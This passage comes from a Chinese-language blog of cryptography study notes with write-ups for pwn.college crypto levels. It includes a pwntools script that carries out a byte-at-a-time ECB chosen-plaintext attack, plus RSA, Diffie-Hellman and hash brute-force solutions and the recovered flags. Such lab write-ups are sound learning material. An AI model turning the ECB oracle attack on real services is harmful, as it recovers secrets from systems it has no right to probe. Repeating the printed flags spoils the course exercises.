Pad：https://zh.wikipedia.org/wiki/%E4%B8%80%E6%AC%A1%E6%80%A7%E5%AF%86%E7%A2%BC%E6%9C%AC</p></li>
<li><p>AES：详见 https://ctf-wiki.org/crypto/blockcipher/aes/</p>
<p>Key Size：128/192/256 bits</p>
<p>Block Size：128 bits（不够则需要补位，pck7标准）</p></li>
<li><p>ECB模式：分块</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240802105701266.png" alt="image-20240802105701266">
<figcaption aria-hidden="true">image-20240802105701266</figcaption>
</figure></li>
<li><p>CBC：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240802105617577.png" alt="image-20240802105617577">
<figcaption aria-hidden="true">image-20240802105617577</figcaption>
</figure></li>
<li><p>CTR：计数每次加1</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240802111654091.png" alt="image-20240802111654091">
<figcaption aria-hidden="true">image-20240802111654091</figcaption>
</figure></li>
<li><p>Key Exchange：交换密钥</p>
<p>满足交换律的运算：加法，乘法，Paint Mixing</p>
<p>原根（Primitive
root）：https://zh.wikipedia.org/wiki/%E5%8E%9F%E6%A0%B9</p>
<p>Diffie–Hellman key exchange</p></li>
</ul>
<h4 id="key-exchange交换密钥">Key Exchange：交换密钥</h4>
<ul>
<li><p>满足交换律的运算：加法，乘法，Paint Mixing</p></li>
<li><p>原根（Primitive
root）：https://zh.wikipedia.org/wiki/%E5%8E%9F%E6%A0%B9</p></li>
<li><p><a target="_blank" rel="noopener" href="https://thiscute.world/posts/practical-cryptography-basics-5-key-exchange/">Diffie–Hellman
key exchange</a>（D-H）：密钥交换</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240803104543316.png" alt="image-20240803104543316">
<figcaption aria-hidden="true">image-20240803104543316</figcaption>
</figure></li>
</ul>
<h4 id="asymmetric-encryption非对称加密">Asymmetric
Encryption（非对称加密）</h4>
<ul>
<li><p>公钥和私钥：公钥用于加密，私钥用于解密</p></li>
<li><p>Fermat's little
theorem（费马小定理）：https://zh.wikipedia.org/wiki/%E8%B4%B9%E9%A9%AC%E5%B0%8F%E5%AE%9A%E7%90%86</p></li>
<li><p>Euler's
Theorem（欧拉定理）：https://zh.wikipedia.org/wiki/%E6%AC%A7%E6%8B%89%E5%AE%9A%E7%90%86_(%E6%95%B0%E8%AE%BA)</p></li>
<li><p>RSA：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240803153341591.png" alt="image-20240803153341591">
<figcaption aria-hidden="true">image-20240803153341591</figcaption>
</figure></li>
</ul>
<h4 id="hashing">Hashing</h4>
<ul>
<li>散列函数（哈希函数）：结果一般为固定长度字符串</li>
<li>hash with
salt：https://zh.wikipedia.org/wiki/%E7%9B%90_(%E5%AF%86%E7%A0%81%E5%AD%A6)</li>
</ul>
<h3 id="练习-5">练习</h3>
<ul>
<li><p>level1：base64解码</p>
<p>wp：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(<span class="string">""</span>))</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level2：一次性密码本</p>
<p>wp：题目给出base64编码状态下的密钥和密文，我一开始直接将两个base64字符串进行异或发现行不通，于是尝试先解码再异或，得到flag</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">import</span> base64</span><br><span class="line">key = <span class="string">"lzygDwIWT8kdWoKrgRvtrAbQ7cBuDUDDNSvX0Gu0GnacUUJ3H1Hd90MqbU8pT680nI/TcdT6vzctZw=="</span></span><br><span class="line">b = <span class="string">"50vOIWF5I6V4PefQyHeV3V+63rU0ZhOgUESZ6Tr4byHkF28DdQSa2Sd4FwFTAut45eyXPK2vxWBQbQ=="</span></span><br><span class="line">key = base64.b64decode(key)</span><br><span class="line">b = base64.b64decode(b)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">    c += <span class="built_in">chr</span>(b[i]^key[i])</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level3：一次性密码本，密钥可重复使用</p>
<p>wp：密文（secret
ciphertext）已给出，根据题目给出的提示，要求输入明文，然后输出密文。于是我尝试将给定的密文当作明文输入然后得到新的密文，如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">secret ciphertext (b64): y1GAvqAJ5TANUn2ZarGZGXRD3I26DTAfcDtoAV1QKHBXV8jC3FJyeoj96p09m94T7LCkIPGw78X4JQ==</span><br><span class="line">plaintext (b64): y1GAvqAJ5TANUn2ZarGZGXRD3I26DTAfcDtoAV1QKHBXV8jC3FJyeoj96p09m94T7LCkIPGw78X4JQ==</span><br><span class="line">ciphertext (b64): cHduLmNvbGxlZ2V7MHJrRHliUFJSOTRBNC1Pc3NRM1JMLWc5Z2JmLmRWek56TURMeWNETXlVeld9Cg==</span><br></pre></td></tr></tbody></table></figure>
<p>这里的逻辑应该是：</p>
<figure class="highlight markdown"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> flag ^ key = secret ciphertext </span><br><span class="line"></span><br><span class="line"><span class="bullet">2.</span> secret ciphertext  ^ key = ciphertext</span><br><span class="line"></span><br><span class="line">由上述两个式子得到：</span><br><span class="line">flag ^ key ^ key = ciphertext   --&gt;   flag = ciphertext</span><br></pre></td></tr></tbody></table></figure>
<p>因此只需要解码<code>cHduLmNvbGxlZ2V7MHJrRHliUFJSOTRBNC1Pc3NRM1JMLWc5Z2JmLmRWek56TURMeWNETXlVeld9Cg==</code>即可得到flag。</p></li>
<li><p>level4：用ECB模式解码AES密文</p>
<p>wp：这里使用到了新的第三方库<code>pycryptodome</code>，可以直接调用相关函数进行解码</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">a = base64.b64decode(<span class="string">"vOQZoG8aprySJx290+gqTQ=="</span>)</span><br><span class="line">b = base64.b64decode(<span class="string">"SFD4LBev3isNX+sOSP16YkvC4j/tESguw9+M+ZIoovxMNjxZCaPzy51L1Speg0YJyM56R5/BUUHe/x+mKWJZtg=="</span>)</span><br><span class="line"></span><br><span class="line">key = a</span><br><span class="line">text = b</span><br><span class="line">aes = AES.new(key, AES.MODE_ECB) <span class="comment">#创建一个aes对象</span></span><br><span class="line"><span class="comment"># AES.MODE_ECB 表示模式是ECB模式</span></span><br><span class="line">den_text = aes.decrypt(text) <span class="comment"># 解密密文</span></span><br><span class="line"><span class="built_in">print</span>(den_text)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level5：ECB已知密文攻击-https://zachgrace.com/posts/attacking-ecb/</p>
<p>wp：运行<code>/challenge/run</code>，根据<a target="_blank" rel="noopener" href="https://discord.com/channels/750635557666816031/1193137618049831063/threads/1243932046611710034">Discord</a>提示得知这题是关于ECB攻击的题目，因此尝试输入<code>base64.b64encode(b'A'*15)</code>的base64编码，然后再尝试输入<code>base64.b64encode(b'A'*15+b'p')</code>的base64编码（因为flag开头字母是<code>p</code>），得到：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">secret ciphertext (b64): 4SXc1LwERwQOBKZt4rCInS5O3Yevihuy2bnTOPn3DxWZOUY1LZ6B9pHGPJeIsR4gAjWf06jm/2HrwLV2c3Bv+g==</span><br><span class="line">secret ciphertext (hex): e125dcd4bc0447040e04a66de2b0889d 2e4edd87af8a1bb2d9b9d338f9f70f15 993946352d9e81f691c63c9788b11e20 02359fd3a8e6ff61ebc0b57673706ffa</span><br><span class="line">plaintext prefix (b64): QUFBQUFBQUFBQUFBQUFB</span><br><span class="line">ciphertext (b64): ta3Mmvi7a/uvAgdN2uAl0fdN9imt+R0sJxGye4JemYbGOzhwqRHPYZy4RTjv/dn25I3mK8XeotVgMVlyCuPW1nFFsxqEyM8mmpjyEvfsDbQ=</span><br><span class="line">ciphertext (hex): b5adcc9af8bb6bfbaf02074ddae025d1 f74df629adf91d2c2711b27b825e9986 c63b3870a911cf619cb84538effdd9f6 e48de62bc5dea2d5603159720ae3d6d6 7145b31a84c8cf269a98f212f7ec0db4</span><br><span class="line">plaintext prefix (b64): QUFBQUFBQUFBQUFBQUFBcA==</span><br><span class="line">ciphertext (b64): ta3Mmvi7a/uvAgdN2uAl0eEl3NS8BEcEDgSmbeKwiJ0uTt2Hr4obstm50zj59w8VmTlGNS2egfaRxjyXiLEeIAI1n9Oo5v9h68C1dnNwb/o=</span><br><span class="line">ciphertext (hex): b5adcc9af8bb6bfbaf02074ddae025d1 e125dcd4bc0447040e04a66de2b0889d 2e4edd87af8a1bb2d9b9d338f9f70f15 993946352d9e81f691c63c9788b11e20 02359fd3a8e6ff61ebc0b57673706ffa</span><br></pre></td></tr></tbody></table></figure>
<p>发现得到的十六进制密文是相同的，以此类推能够推断出所有字符。推理过程如下（X是未知字符）：</p>
<figure class="highlight markdown"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">AAAAAAAAAAAAAAAp  wn.college{<span class="strong">**XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX**</span>}</span><br><span class="line">AAAAAAAAAAAAAApw  n.college{<span class="strong">**XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX**</span>}</span><br><span class="line">......</span><br><span class="line">pwn.college{cgH6  <span class="strong">**XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX**</span>}</span><br><span class="line">AAAAAAAAAAAAAAAp  wn.college{cgH6<span class="strong">**X  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX**</span>}</span><br><span class="line">......</span><br><span class="line">pwn.college{cgH6ulJVxhfCLLdZrJnv  <span class="strong">**XXXXXXXXXXXXXXXXXXXXXXXX**</span>}</span><br><span class="line">AAAAAAAAAAAAAAAp  wn.college{cgH6u  lJVxhfCLLdZrJnv<span class="strong">**X  XXXXXXXXXXXXXXXXXXXXXX**</span>}</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">pwn.college{cgH6ulJVxhfCLLdZrJnvtIPk91D.ddzNzMDLycDMyUzW}</span><br></pre></td></tr></tbody></table></figure>
<p>这里用到了<code>pwntools</code>工具来编写脚本</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set architecture, os and log level</span></span><br><span class="line">context(arch=<span class="string">"amd64"</span>, os=<span class="string">"linux"</span>, log_level=<span class="string">"info"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Load the ELF file and execute it as a new process.</span></span><br><span class="line">challenge_path = <span class="string">"/challenge/run"</span></span><br><span class="line">p = process(challenge_path)</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">6</span>):  <span class="comment"># 用于获取不同段的字符串</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        payload = base64.b64encode(<span class="string">b'A'</span>*j) + <span class="string">b'\n'</span></span><br><span class="line">        p.sendafter(<span class="string">b"plaintext prefix (b64): "</span>, payload)</span><br><span class="line">        p.recvline()</span><br><span class="line">        string = p.recvline()</span><br><span class="line">        <span class="comment">#print("string:" + string.split()[2].decode())</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            payload_1 = base64.b64encode(<span class="string">b'A'</span>*j+flag.encode()+<span class="built_in">chr</span>(i).encode()) + <span class="string">b'\n'</span></span><br><span class="line">            p.sendafter(<span class="string">"plaintext prefix (b64): "</span>, payload_1)</span><br><span class="line">            p.recvline() <span class="comment"># 注意这里获取的是密文的base64编码</span></span><br><span class="line">            string_1 = p.recvline()  <span class="comment"># 获取密文的十六进制字符串</span></span><br><span class="line">            <span class="comment">#print("string_1:"+string_1.split()[2].decode())</span></span><br><span class="line">            <span class="keyword">if</span> string_1.split()[k].decode() == string.split()[k].decode(): <span class="comment"># 用split得到对应字符串</span></span><br><span class="line">                flag+=<span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"flag is: <span class="subst">{flag}</span>"</span>)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level6：Diffie-Hellman
密钥交换技术（原理见上），填入B的值得到base64编码的密文</p>
<p>wp：这题卡了很久，最后还是靠着非预期得到了flag。一开始我是将B的值设为与A相同，没有得到正确flag，然后尝试将B的值设为与p值相同，得到密文，解码竟然得到了flag，但这不是正确的解题思路</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p: 0xffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aacaa68ffffffffffffffff</span><br><span class="line">g: 0x2</span><br><span class="line">A: 0xfa0b8116dec4ecacf9ef4caff2749e29a4945759b62e7c41a91c3c03583154a3f8a1744c07d130d1b2b395274c575054cef6aa73d86227d9061c14451b815f7796c4a8640eab5daf0c3e689ab3e439b6658e5db3d75070fab9d805bcbbb13da12319a79498007de2b95c7be9a2b0fa85d112094cc80c92a8d98fefb2f6f004bf29066d42745e39b02f64beca200e8b30525f7049ac9e4b090df91ed5eb4d346278cd7956250344f689d43a04074f1da36a8d4846c17a5659c754ddd792320d4e13e8ed93b713633d21e253af41331c27a201d13819ddbda3353ce55d5297534f308e70155370edd6a01e098ee16f8c1a45f9a5a989436c374286373655c73c8a</span><br><span class="line">B: 0xffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aacaa68ffffffffffffffff</span><br><span class="line">secret ciphertext (b64): cHduLmNvbGxlZ2V7VUdoLVplcDVqY2YxN0FQNS1wa3MtU1Z1d0VyLmRoek56TURMeWNETXlVeld9Cg==</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level7：通过RSA的公钥和私钥解密</p>
<p>wp：运行challenge，给出了<code>e</code>,<code>d</code>,<code>n</code>以及密文，根据RSA算法通过<code>pow(密文, d, n)</code>能够得到答案，但是运行脚本得不到结果，后来看到discord上有人提示使用<code>less /challenge/run</code>能够查看挑战源码，发现第七关代码如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">level7</span>():</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    In this challenge you will decrypt a secret encrypted with RSA (Rivest–Shamir–Adleman).</span></span><br><span class="line"><span class="string">    You will be provided with both the public key and private key.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    key = RSA.generate(<span class="number">2048</span>)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(flag) &lt;= <span class="number">256</span></span><br><span class="line">    ciphertext = <span class="built_in">pow</span>(<span class="built_in">int</span>.from_bytes(flag, <span class="string">"little"</span>), key.e, key.n).to_bytes(<span class="number">256</span>, <span class="string">"little"</span>)</span><br><span class="line">    show_hex(<span class="string">"e"</span>, key.e)</span><br><span class="line">    show_hex(<span class="string">"d"</span>, key.d)</span><br><span class="line">    show_hex(<span class="string">"n"</span>, key.n)</span><br><span class="line">    show_b64(<span class="string">"secret ciphertext"</span>, ciphertext)</span><br></pre></td></tr></tbody></table></figure>
<p>其中<code>int.from_bytes()</code>以及<code>to_bytes()</code>函数一般默认以大端序将字节解释为整数，而源码中用到的是小端序，因此wp脚本中也该使用小端序，代码如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">secret_m = <span class="string">"VbWfMzwMhfVxTxPBD/WLAWRiAtR8g1Y+YuJdf2xqdENvDHO4v2QM5kkEJVYZLt+eXCNGiIGy/WiHo9blLlqRKb7SPXUef0rdoZaQ5ZeG2WRtzbPWWdrugnWoXKu60xzjTBQ0qdvclmXZyFnbUaU+vj9HykULn0vwHC/s3e2PUgeE8FyBvxoX6sVFzauPyenv+2NyqCZDoz96xAEJeKAVKhDrV8lbxTSyPT6y7V174dO1+EGl0gpGBGJTfFfCYdD/6YLhTHi0K3owEdjm2FB6eWiZBFDyT7K/VBin33cBqpuyemAVztJaO90V+HkbGIve98RZd9sNjx1U6olzehmbPA=="</span></span><br><span class="line">secret_m = base64.b64decode(secret_m)</span><br><span class="line">d = <span class="number">0x545652bb7b4478a66b726fefb48a45826e51c8475446d91b2c3ffde600a22f384648f503fd67a907d6d1c76b3666741526093de8652b5c45b9656b4e665f6d34cd61ed89a488513ca138f952a04ce0e719e6cbe9a5d11f29d8b7d0ca541fa6e8efce584d6551cbba0b775cac43db97cdfbfb1a3a5a7318a7e19d3f3705837c1933450044c5c69c910c3657bf1f587e7c6285568e4854d10b2c086c6745e60dede8daa52c5c556a3933eb395918f3f8d03c26ae0e9359d1d78c40b5c2201efe503575a6ae30b940ceb44e1197c423321bb5b934ddc61034da3991f088334f3abb779ee4c00b3d689701159d51e8227175d9b8571b267581a4d6157e556a2c09a1</span></span><br><span class="line">n = <span class="number">0xee7d0787f9a314b5ba76e4301f09eb765db7421c6a8d01590b85cfd1536bb7d4c2c66bc63c0aacd742d2d32a20899d82a1574316be8fb37c65371ad145b2a13a87197b6670c73e5a83e7e762a2c45d895a8da0ebf5b10dfeac55a5016139d3618b1508590c462cd839cec7ed45a1c0a87847a5653b7168d623948df709ecc0f70df58b4ed8120faa259bdbb669feea6c7befb6ec22fd8252b2650fea4d8081a862c040528a0d28aea3c55dfb033089df51fdb12b6ac60fe04b18a28d072c6da7a712f91625f118fc49af2f1764fb56075f8608e3dccfd2ea4d2d8270c0595aa1346ccb0a8442ce29d2e034bd1125550634bb843b95b6ce837c74b8bc714b43f9</span></span><br><span class="line">m = <span class="built_in">pow</span>(<span class="built_in">int</span>.from_bytes(secret_m, <span class="string">"little"</span>), d, n).to_bytes(<span class="number">256</span>, <span class="string">"little"</span>).<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment"># x = pow(y, d, n)#.to_bytes(256, "little").hex()</span></span><br><span class="line"><span class="comment"># print(hex(x))</span></span><br><span class="line"><span class="comment"># print(m)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(secret_m, <span class="string">"little"</span>)))</span><br><span class="line"><span class="comment">#m = hex(pow(s, d, n))</span></span><br><span class="line">cleartext_hex = m</span><br><span class="line"><span class="comment"># print("Cleartext Hex: ", cleartext_hex)</span></span><br><span class="line"></span><br><span class="line">cleartext_bytes = <span class="built_in">bytes</span>.fromhex(cleartext_hex)</span><br><span class="line"><span class="comment"># print("Cleartext Bytes: ", cleartext_bytes)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># decode</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Cleartext Message: "</span>, cleartext_bytes.decode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level8：RSA算法给定<code>e</code>、<code>p</code>、<code>q</code>以及密文，求解明文</p>
<p>WP：关键是利用<strong>扩展欧几里得算法</strong>计算求出<code>d</code>的值，私钥指数
d 是公钥指数 e 的模 ϕ(n)（即<code>(p-1)*(q-1)</code>）
的乘法逆元，具体实现如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inverse</span>(<span class="params">a,m</span>):</span><br><span class="line">	<span class="keyword">if</span> math.gcd(a,m) != <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">raise</span> ValueError(<span class="string">"a和m必须互质"</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">pow</span>(a, -<span class="number">1</span>, m)  <span class="comment"># 计算模逆元</span></span><br></pre></td></tr></tbody></table></figure>
<p>完成代码如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inverse</span>(<span class="params">a,m</span>):</span><br><span class="line">	<span class="keyword">if</span> math.gcd(a,m) != <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">raise</span> ValueError(<span class="string">"a和m必须互质"</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">pow</span>(a, -<span class="number">1</span>, m)  <span class="comment"># 计算模逆元</span></span><br><span class="line">secret_m = <span class="string">"82JbqdZh5kV/6Rpq3EthtJSjxZkYrfj7+qKdkzarL/8hi+dVndN3iDyto+UuAws1KbXyUGMWXATiOwvbGPtLJDJmyURj1ER6jEGJQtDt9g+NsZRzN21UDCTLkplTtZo1ZyPYTSPUiOMoPSYBU+pfZ5vwZRlQBhbq5Pb5vIoqeoBkUn/OTa2MEnXKV7/wUcT1wjnYIXQloqghy16YViQ8RveEW7md6S1LlNb4nLmJOESRAHvl6YENOJQ1pTNOEaccNmggEoWTdv3cCLBXxvt7wH4hsUMhEI1l5zFK7dWz5X4f0AsNf0B2kfAaJ53rB9w7ADGzNIF8MHO6o6LvYhTLkg=="</span></span><br><span class="line">secret_m = base64.b64decode(secret_m)</span><br><span class="line">p = <span class="number">0xb967abff3506c59500ae51ed28156e32528ddc3e87b1e01c95e8e5f6b724cbaf08f537cf3279134d886e8f5a3b8165dbcbe64bff248ba120b4628a962e8696d0971e122c09a2093eb08d13dc4cc2254b0cc682522e3f225f13e23c921c330fbb5200038f4e7f9083d699d52c2723ace20f8ab1e1ed0c161fc76e8098372ea753</span></span><br><span class="line">q = <span class="number">0xd39d2fef4307fce60af097d6d1ca15bc8256e83f537bb534b1f264222758015ac9cece15a56213e1170ae98250bf3aad5fd44b23b810e2093d252c272ec14e7460ef06dc3e463521d5e58a7ed54cb60cef6b655fae51f4d544998f152373c72a5a933dce5e3f325586b6f2c06d71247994b186fa253663795ef1792792236375</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = p * q</span><br><span class="line">x = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = mod_inverse(e, x)</span><br><span class="line">m = <span class="built_in">pow</span>(<span class="built_in">int</span>.from_bytes(secret_m, <span class="string">"little"</span>), d, n).to_bytes(<span class="number">256</span>, <span class="string">"little"</span>).<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment"># x = pow(y, d, n)#.to_bytes(256, "little").hex()</span></span><br><span class="line"><span class="comment"># print(hex(x))</span></span><br><span class="line"><span class="comment"># print(m)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(secret_m, <span class="string">"little"</span>)))</span><br><span class="line"><span class="comment">#m = hex(pow(s, d, n))</span></span><br><span class="line">cleartext_hex = m</span><br><span class="line"><span class="comment"># print("Cleartext Hex: ", cleartext_hex)</span></span><br><span class="line"></span><br><span class="line">cleartext_bytes = <span class="built_in">bytes</span>.fromhex(cleartext_hex)</span><br><span class="line"><span class="comment"># print("Cleartext Bytes: ", cleartext_bytes)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># decode</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Cleartext Message: "</span>, cleartext_bytes.decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level9：要求找到一个与给定密文相同的哈希前缀（<strong>哈希前缀碰撞</strong>），注意要求输入base64编码</p>
<p>WP：由于只需要匹配前两个字节即16位，因此可以暴力求解</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">secret_sha = <span class="string">"1Hk="</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha256</span>(<span 